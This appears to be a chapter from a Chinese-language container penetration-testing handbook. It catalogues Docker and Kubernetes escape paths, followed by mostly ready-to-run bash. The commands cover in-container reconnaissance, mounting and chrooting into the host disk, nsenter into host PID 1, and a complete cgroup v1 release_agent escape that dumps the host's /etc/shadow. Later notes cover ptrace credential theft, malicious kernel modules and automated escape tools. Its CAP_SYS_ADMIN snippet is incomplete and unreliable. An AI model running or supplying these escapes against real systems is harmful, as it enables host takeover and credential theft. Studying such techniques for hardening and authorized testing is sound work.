## 三、容器逃逸技术全景

### 3.1 逃逸路径矩阵

| 逃逸方式 | 前提条件 | 影响 | 复杂度 | 检测规避难度 |
|---------|---------|------|-------|------------|
| 特权容器 | `--privileged` | 完全逃逸（宿主机 root） | 低 | 低 |
| Docker Socket 挂载 | `/var/run/docker.sock` | 完全逃逸 | 低 | 低 |
| 宿主机 PID | `--pid=host` | nsenter 逃逸 | 低 | 低 |
| 宿主机网络 | `--net=host` | 网络层逃逸/旁路 | 低 | 中 |
| 宿主机文件系统 | `-v /:/host` | 任意文件读写 | 低 | 低 |
| CAP_SYS_ADMIN | `--cap-add=SYS_ADMIN` | mount/cgroup 逃逸 | 中 | 中 |
| CAP_SYS_PTRACE | `--cap-add=SYS_PTRACE` | 进程注入/凭据窃取 | 中 | 中 |
| CAP_DAC_READ_SEARCH / CAP_SYS_MODULE / CAP_NET_ADMIN | 危险 CAP 组合 | 多种逃逸 | 中 | 中 |
| cgroup notify_on_release | v1 + 特权/cap | 逃逸 | 中 | 中 |
| user namespace 配置错误 | userns 映射缺陷 | rootless 逃逸 | 高 | 高 |
| 内核漏洞 | 特定 CVE（见第四章） | 内核级逃逸 | 高 | 高 |
| eBPF 滥用 | CAP_BPF/CAP_SYS_ADMIN + bpf syscall | 跨容器/逃逸/rootkit（见第九章） | 高 | **极高** |

### 3.2 逃逸前置侦察（容器内信息收集）

```bash
# 判断是否在容器中
cat /proc/1/cgroup | head -5        # 含 /docker/ /kubepods/ 前缀 = 容器内
ls -la /.dockerenv 2>/dev/null

# capabilities 检查
capsh --print
grep Cap /proc/self/status
capsh --decode=$(grep CapEff /proc/self/status | awk '{print $2}')

# 危险挂载检查
mount | grep -E "(docker.sock|/etc/hosts|overlay|host)"
ls -la /var/run/docker.sock /run/containerd/containerd.sock /run/docker.sock 2>/dev/null
find / -maxdepth 3 -name "*.sock" 2>/dev/null

# 设备访问
ls -la /dev/ | head -30             # 出现宿主机磁盘 sda/vda = 特权
cat /proc/self/status | grep Seccomp

# 内核版本（决定可用的逃逸 CVE）
uname -r
```

### 3.3 特权容器逃逸

```bash
# 直接挂载宿主机磁盘
ls /dev/sda1 /dev/vda1 /dev/nvme0n1p1 2>/dev/null
mkdir -p /mnt && mount /dev/sda1 /mnt 2>/dev/null && chroot /mnt /bin/bash

# cgroup v1 notify_on_release 逃逸
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > $host_path/output" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
sleep 2
cat /output

# 特权容器 + nsenter（宿主机 PID 可见时）
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
```

### 3.4 CAP_SYS_ADMIN 逃逸（mount + userns）

```bash
# 判断 user namespace 可用
unshare -Urm true && echo "userns OK" || echo "userns denied"

# 利用 mount + pivot_root 逃逸（CAP_SYS_ADMIN + 可写挂载点）
mkdir -p /tmp/x
unshare -m --propagation slave true
mount -t proc proc /proc
# 进阶：挂载宿主 overlay 上层目录/利用 release_agent（见 3.3）

# CAP_SYS_ADMIN 但非特权容器时的核心思路：
# 1. 确认 CapEff 含 cap_sys_admin
# 2. 尝试 mount 宿主设备/目录（/etc/hosts 指向宿主文件时挂载覆盖）
# 3. 利用 cgroup v1 + release_agent（前提：能挂载 cgroup）
```

### 3.5 其他危险 CAP 利用

```bash
# CAP_SYS_PTRACE → 进程注入（若可见宿主进程）
# 利用 gdb/自定义 ptrace 读取 /proc/1/mem 提取宿主进程内存中的凭据

# CAP_SYS_MODULE → 直接加载恶意内核模块（= 内核级 rootkit/完全控制）
# CAP_DAC_READ_SEARCH → 绕过文件读权限遍历宿主文件系统
# CAP_NET_ADMIN → iptables 劫持流量、tcpdump 嗅探、修改网络栈

# 综合工具：CDK / amicontained / deepce
amicontained            # 输出容器拥有的 capabilities 与逃逸可行性
CDK evaluate            # 容器渗透评估
deepce --auto           # 自动检测可逃逸配置
```

### 3.6 命名空间隔离绕过（基础面）

```
1. PID namespace：--pid=host 时容器可见全部宿主进程 → nsenter/信号注入
2. Network namespace：--net=host 时共享宿主网络栈 → 嗅探/旁路防火墙
3. Mount namespace：错误挂载（-v /、/etc/hosts、/proc）→ 直接读写宿主文件
4. IPC namespace：--ipc=host → 读取宿主共享内存/信号量中的凭据
5. UTS namespace：--uts=host → 影响宿主机 hostname（低危）
6. User namespace：映射缺陷（uid 0 映射到宿主非特权用户）→ rootless 逃逸探索
```

